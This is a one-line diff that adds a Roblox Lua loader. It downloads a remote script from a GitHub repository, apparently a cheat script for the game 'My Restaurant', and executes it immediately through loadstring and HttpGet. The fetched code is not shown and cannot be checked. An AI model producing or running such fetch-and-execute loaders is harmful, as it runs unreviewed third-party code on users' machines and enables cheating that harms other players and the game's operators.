@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/itzRolf/Collection/main/My%20Restaurant/source.lua",true))()
